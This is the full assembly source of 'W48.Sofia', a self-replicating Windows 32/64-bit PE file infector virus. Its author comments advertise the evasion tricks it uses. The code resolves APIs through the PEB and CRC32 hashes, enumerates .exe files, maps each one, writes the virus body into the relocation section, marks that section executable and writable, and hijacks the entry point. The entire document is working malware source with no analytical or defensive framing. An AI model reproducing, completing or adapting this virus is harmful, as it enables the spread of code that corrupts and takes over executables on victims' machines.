comment ~

W48.Sofia

- Windows 7 PE 32/64-bit cross-platform file infector
- reloc overwriter to avoid file size increase
- VEH to protect from exceptions and PEB to find DLL addresses in both platforms 32/64-bit
- 32-bit checksums (to optimize code size by not using API names)

this thing supports fastcall/stdcall without using two codes! ;)
~ 

extern GetTickCount:proc
extern WriteFile:proc
extern ExitProcess:proc 
extern Sleep:proc
include sofia.inc

.code
entry64         proc                         ;/entry:entry64
        mov     rax, V
        push    rax
        jmp     sofia_inner                  ;skip push

message         label   near
        push    "1+p2"                       ;we have sold in the cold, physical design
        push    rsp
        pop     rcx
        xor     rbx, rbx
        push    rbx
        sub     rsp, 20h
        xor     r9, r9
        mov     r8, 4
        push    rcx
        pop     rdx
        mov     rcx, -0bh
        call    WriteFile
        mov     rcx, 7c2h
        call    Sleep 
        push    rbx
        pop     rcx
        call    ExitProcess

sofia_push      label    near
        push    "2p+1"                       ;compatible size for 32/64-bit because it is RVA

sofia_inner     label    near
        call    l2
l2:     pop     rcx
        sub     rcx, (offset l2 - offset sofia_push) - (offset esprsp_save - offset sofia_push)
        mov     qword ptr [rcx], rsp
        call    riprel
        jecxz   go_peb32
        push    60h                          ;here begins 64-bit part, not executed in 32-bit mode!
        pop     rsi
        lods    qword ptr gs:[rsi]
        mov     rcx, qword ptr [rax + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE + 8]
        add     qword ptr [rsp], rcx         ;convert RVA to VA
        mov     rax, qword ptr [rax + PROCESS_ENVIRONMENT_BLOCK_LDR_DATA64]
        mov     rsi, qword ptr [rax + InMemoryOrderModuleList64]
        lods    qword ptr [rsi]
        push    rax
        mov     rbp, qword ptr [rax + 20h]
        jmp     double_call                  ;here ends 64-bit part

esprsp_save     label    near
        dd      0, 0

go_peb32        label    near                ;here begins 32-bit part, not executed in 64-bit mode!
                                             ;most instruction are hard-coded, because prefix 67 changes the address size
        push    30h
        pop     rsi
        db      64h                          ;FS prefix
        db      0adh
        db      08bh, 048h, PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE
        db      001h, 00ch, 024h             ;convert RVA to VA
        db      08bh, 040h, PROCESS_ENVIRONMENT_BLOCK_LDR_DATA32
        db      08bh, 070h, InMemoryOrderModuleList32
        db      0adh
        push    rax
        db      08bh, 068h, 018h             ;here ends 32-bit part

double_call     label    near
        call    call_wdll

delta_ptr       label    near

;-------------------------------------------------------------------------------
;API CRC lists for ntdll.dll and kernel32.dll
;-------------------------------------------------------------------------------

        dd      0baab0208h
        dd      0fed80136h
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0391ab6afh
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0b09315f4h
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        db      2eh, 65h, 78h, 65h, 0        ;executable file

;-------------------------------------------------------------------------------
;walk lists
;32-bit and 64-bit fully compatible DLL walker. using 32-bit hashes instead of strings
;-------------------------------------------------------------------------------

walk_dll        label    near
        push    rbp
        push    rsp                          ;stack frame - not MOV because in 32-bit R encoding decrease EAX
        pop     rbx

walk_start      label    near      
        mov     rax, qword ptr [rbx]
        push    rax
        pop     rdx
        add     al, IMAGE_DOS_HEADER.e_lfanew * 2
        call    riprel
        jecxz   l1
        add     al, IMAGE_OHDD64_EXPORT_TABLE - (IMAGE_DOS_HEADER.e_lfanew * 2)
l1:     add     eax, dword ptr [rdx + IMAGE_DOS_HEADER.e_lfanew]
        mov     ebp, dword ptr [rax]
        add     rbp, rdx
        xor     rdx, rdx

walk_names      label    near
        mov     esi, dword ptr [rbp + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     rsi, qword ptr [rbx]
        mov     esi, dword ptr [rsi + rdx * 4]
        add     rsi, qword ptr [rbx]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [rsi]
        push    8
        pop     rcx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     esi
        cmp     byte ptr [rsi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [rdi], eax
        je      l_res
        inc     edx
        cmp     dword ptr [rbp + IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names

;-------------------------------------------------------------------------------
;repair ESP/RSP register
;-------------------------------------------------------------------------------

repair_rspret   label    near
        call    delta_loc

delta_loc       label    near
        pop     rcx
        sub     rcx, offset delta_loc - offset esprsp_save
        mov     rsp, qword ptr [rcx]
        ret
        
;-------------------------------------------------------------------------------
;resolve API address
;-------------------------------------------------------------------------------

l_res           label    near
        mov     esi, dword ptr [rbp + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     rsi, qword ptr [rbx]
        movzx   esi, word ptr [rsi + rdx * 2]
        mov     ecx, dword ptr [rbp + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     rcx, qword ptr [rbx]
        mov     ecx, dword ptr [rcx + rsi * 4]
        add     rcx, qword ptr [rbx] 
        push    rcx
        scas    dword ptr [rdi]
        cmp     byte ptr [rdi], "*"
        jne     walk_start
        call    riprel
        jecxz   jump32_addr
        jmp     qword ptr [rbx + 8]          ;executed only in 64-bit mode

jump32_addr     label    near                ;executed only in 32-bit mode
        db      0ffh, 063h, 004h             ;jmp dword ptr [ebx + 4]

;-------------------------------------------------------------------------------
;masm64 does not support RIP
;-------------------------------------------------------------------------------

riprel          proc
        push    rax                          ;must save because in 32-bit R encoding decrease EAX:
        db      048h, 08dh, 00dh             ;lea rcx, qword ptr [rip]
        dd      0
        pop     rax
        ret
riprel          endp

;-------------------------------------------------------------------------------
;calls to retrieve API addresses
;----
;find exe files
;-------------------------------------------------------------------------------

call_wdll       label    near
        pop     rdi
        call    walk_dll
        call    riprel
        jecxz   find_kstk32
                                             ;here begins 64-bit part, not executed in 32-bit mode!
        mov     rsi, qword ptr [rbx + 10h]
        lods    qword ptr [rsi]
        mov     rbp, qword ptr [rax + MODULE_LIST_KERNEL32_64BIT]
        jmp     gather_kapis                 ;here ends 64-bit part

find_kstk32     label    near                ;here begins 32-bit part, not executed in 64-bit mode!
        db      08bh, 073h, 008h
        db      0adh
        db      08bh, 068h, MODULE_LIST_KERNEL32_32BIT
                                             ;here ends 32-bit part
gather_kapis    label    near
        scas    byte ptr [rdi]
        call    walk_dll
        push    rdi
        pop     rcx
        push    rsp
        pop     rdi
        enter   sizeof WIN32_FIND_DATA + (sizeof IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint - 2) + 8, 0
        push    rsp
        pop     rsi
        push    rsi
        pop     rdx
        sub     rsp, 18h
        push    rsi                          ;in 32-bit param2 
        push    rcx                          ;in 32-bit param1
        push    kFindFirstFileA
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL
        push    rax
        pop     rbp
        xor     rbx, rbx

;-------------------------------------------------------------------------------
;map view
;-------------------------------------------------------------------------------

create_map1     label    near
        push    rsi
        push    3                            ;GENERIC_READ or GENERIC_WRITE or OPEN_EXISTING
        pop     rdx
        push    rbp                          ;must be saved (because in 32-bit r8/r9 encoding decrease EBP) and here aligns 64-bit stack
        push    rbx
        push    rbx
        push    rdx                          ;OPEN_EXISTING
                                             ;all params above until label are for 32-bit and 64-bit API call
        xor     r9, r9
        xor     r8, r8
        lea     rcx, qword ptr [rsi + WIN32_FIND_DATA.cFileName]
        push    rbx                          ;in 32-bit param4
        push    rbx                          ;in 32-bit param3
        push    rdx                          ;in 32-bit param2 - GENERIC_READ or GENERIC_WRITE
        push    rcx                          ;in 32-bit param1
        push    kCreateFileA                 ;replace with push rdx / pop rax / call ... and then: call qword ptr [rdi + rax * 2]
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL
        push    rax
        push    rax
        push    rbx                          ;in 32-bit param6
        push    rbx                          ;in 32-bit param5
                                             ;all params above until call are for 32-bit and 64-bit API call
        xor     r9, r9
        push    rax                          ;must save RAX (because in 32-bit r8 encoding destroys it)
        push    4                            ;PAGE_READWRITE
        pop     r8
        pop     rax
        push    rbx
        pop     rdx
        push    rax
        pop     rcx
        push    rbx                          ;in 32-bit param4
        push    4                            ;in 32-bit param3 - PAGE_READWRITE
        push    rdx                          ;in 32-bit param2
        push    rax                          ;in 32-bit param1
        push    kCreateFileMappingA
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL
        push    rax
        pop     rsi
        push    rax                          ;in 64-bit align stack
        push    rbx                          ;in 32/64-bit param 5
        xor     r9, r9
        xor     r8, r8
        push    2                            ;FILE_MAP_WRITE
        pop     rdx
        push    rsi
        pop     rcx
        push    rbx                          ;in 32-bit param4
        push    rbx                          ;in 32-bit param3
        push    rdx                          ;in 32-bit param2 - FILE_MAP_WRITE
        push    rsi                          ;in 32-bit param1
        push    kMapViewOfFile
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL 
        push    rax
        pop     rbp
        call    infect_file
        push    rcx
        call    riprel
        jecxz   vehfix_call32 
        pop     rcx                          ;here begins 64-bit part, not executed in 32-bit mode!
        mov     rax, qword ptr [rcx + POINTER_CONTEXT_RECORD64]
        add     rax, 7fh
        call    vehfix_regs64
        jmp     remove_veh                   ;here ends 64-bit part

vehfix_call32   label    near
        pop     rcx                          ;here begins 32-bit part, not executed in 64-bit mode!
                                             ;instruction is hard-coded, because prefix 67 changes the address size
        db      08bh, 041h, POINTER_CONTEXT_RECORD32
        add     eax, 7fh
        call    vehfix_regs32                ;here ends 32bit part

remove_veh      label    near
        pop     rcx
        pop     rdi
        pop     rsi
        pop     rbx
        pop     rbp
        push    rax                          ;in 64-bit align stack
        push    rcx                          ;in 32-bit param1
        push    ntRtlRemoveVectoredExceptionHandler
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL
        pop     rax                          ;in 64-bit re-align stack because of later push param1
        push    rbp
        pop     rcx
        push    kUnmapViewOfFile
        pop     rax
        call    call_apisize
        push    rbp                          ;in 32-bit param1
        call    qword ptr [rdi]
        push    rsi
        pop     rcx
        push    rax                          ;in 64-bit align stack
        push    rsi                          ;in 32-bit param1
        call    qword ptr [rdi]              ;32/64-bit compatible CALL
        call    riprel
        jecxz   clean_stack32
        add     rsp, 80h                     ;in 64-bit mode only

        ;both 32-bit and 64-bit modes

clean_stack32   label    near
        pop     rax
        pop     rax
        pop     rax
        pop     rcx
        push    rcx
        call    qword ptr [rdi]              ;32/64-bit compatible CALL
        call    riprel
        jecxz   find_next
        add     rsp, 40h                     ;in 64-bit mode only

        ;both 32-bit and 64-bit modes

find_next       label    near
        pop     rbp
        pop     rsi
        push    rsi
        pop     rdx
        push    rbp
        pop     rcx
        push    rsi                          ;in 32-bit param2
        push    rbp                          ;in 32-bit param1
        push    kFindNextFileA
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL
        test    eax, eax
        jnz     create_map1
        jmp     repair_rspret

;-------------------------------------------------------------------------------
;distinguish platform before CALL - multiply index
;-------------------------------------------------------------------------------

call_apisize    proc
        push    rcx
        call    riprel
        jecxz   addr_api32bit
        shl     eax, 3                       ;in 64-bit mode only
        pop     rcx
        ret

addr_api32bit   label    near                ;in 32-bit mode only
        shl     eax, 2
        pop     rcx
        ret
call_apisize    endp

;-------------------------------------------------------------------------------
;VEH fixer must be separated 
;-------------------------------------------------------------------------------

vehfix_regs32   proc                         ;in 32-bit mode only
        pop     qword ptr [rax + CONTEXT_EIP - 7fh]
        push    qword ptr [rax + CONTEXT_EDX - 7fh]
                                             ;ESP is lost
        pop     qword ptr [rax + CONTEXT_ESP - 7fh]
        jmp     return_veh

vehfix_regs32   endp

vehfix_regs64   proc                         ;in 64-bit mode only
        pop     qword ptr [rax + CONTEXT_RIP - 7fh]
        push    qword ptr [rax + CONTEXT_RDX - 7fh]
                                             ;RSP is lost
        pop     qword ptr [rax + CONTEXT_RSP - 7fh]

        ;both 32-bit and 64-bit modes

return_veh      label    near
        or      eax, EXCEPTION_CONTINUE_EXECUTION
        ret        
vehfix_regs64   endp

;-------------------------------------------------------------------------------
;VEH protects from crashes in both 32-bit and 64-bit code
;-------------------------------------------------------------------------------

infect_file     proc
        pop     rcx
        push    rcx
        pop     rdx
        push    rcx                          ;in 32-bit param2
        push    rdx                          ;in 32-bit param1
        push    ntRtlAddVectoredExceptionHandler
        pop     rax
        call    call_apisize
        call    qword ptr [rdi + rax]        ;32/64-bit compatible CALL 
        push    rbp
        push    rbx
        push    rsi
        push    rdi
        push    rax
        mov     rdx, rsp                     ;save in compatible register both modes
                                             ;do not use the register:

;-------------------------------------------------------------------------------
;MZ and PE signatures
;-------------------------------------------------------------------------------

check_mzpe      label    near
        push    rbp
        pop     rbx
        cmp     word ptr [rbx], "ZM"
        jne     call_veh
        add     ebx, dword ptr [rbx + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [rbx], "EP"
        jne     call_veh

;-------------------------------------------------------------------------------
;AMD64 or I386
;GUI or CUI mode
;----
;if the code fits in relocs then infect
;-------------------------------------------------------------------------------

        push    IMAGE_OHDD64_RELOC_TABLE
        mov     cx, word ptr [rbx + IMAGE_NT_HEADERS.FileHeader.Machine]
        cmp     cx, IMAGE_FILE_MACHINE_AMD64
        je      infect_co
        cmp     cx, IMAGE_FILE_MACHINE_I386
        jne     call_veh
        push    IMAGE_OHDD32_RELOC_TABLE

infect_co       label    near
        movzx   rcx, byte ptr [rbx + (IMAGE_OH32_SUBSYSTEM or IMAGE_OH64_SUBSYSTEM)]
        sub     cl, 2
        cmp     cl, IMAGE_SUBSYSTEM_WINDOWS_CUI - IMAGE_SUBSYSTEM_WINDOWS_GUI
        jnbe    call_veh
        movzx   rcx, word ptr [rbx + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        push    rcx
        movzx   rcx, word ptr [rbx + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    rcx, rcx, sizeof IMAGE_SECTION_HEADER
        lea     rsi, qword ptr [rbx + rcx + (IMAGE_NT_HEADERS.OptionalHeader64 - sizeof IMAGE_SECTION_HEADER)]
        pop     rcx
        add     rsi, rcx
        pop     rcx
        push    rcx
        mov     ecx, dword ptr [rbx + rcx]
                                             ;relocation data should be at beginning of last section
        cmp     dword ptr [rsi + IMAGE_SECTION_HEADER.VirtualAddress], ecx
        jne     call_veh
        push    rcx
        mov     ecx, offset sofia_end - offset sofia_push
        push    rcx
                                             ;large enough to contain the code
        cmp     dword ptr [rsi + IMAGE_SECTION_HEADER.SizeOfRawData], ecx
        jnb     copy_code

call_veh        label    near
        int     3

copy_code       label    near
        mov     edi, dword ptr [rsi + IMAGE_SECTION_HEADER.PointerToRawData]
        add     rdi, rbp
        pop     rcx                          ;code size
        push    rsi
        push    rdi
        call    l3
l3:     pop     rsi
        sub     rsi, offset l3 - offset sofia_push

                                             ;copy code to relocs
        rep     movs byte ptr [rdi], byte ptr [rsi]
        pop     rdi
        pop     rsi
        or      dword ptr [rsi + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_WRITE
        pop     rcx                          ;reloc relative address
        xchg    dword ptr [rbx + IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint], ecx
        mov     dword ptr [rdi + 1], ecx
        pop     rcx
        mov     dword ptr [rbx + rcx], 0
        int     3
infect_file     endp
sofia_end       label    near
entry64         endp
end